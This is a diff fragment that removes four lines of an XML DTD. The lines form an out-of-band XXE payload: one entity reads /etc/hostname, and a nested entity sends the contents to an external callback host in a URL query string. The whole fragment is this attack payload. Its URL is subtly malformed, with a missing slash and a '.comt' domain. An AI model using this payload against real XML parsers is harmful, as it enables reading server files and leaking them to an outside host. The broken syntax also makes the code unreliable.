@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https:/5msxl9dlw0rg90r96b6tb8mgd7jz7o.burp.csirapp.comt/?x=%file;'>">
-%eval;
-%exfiltrate; 
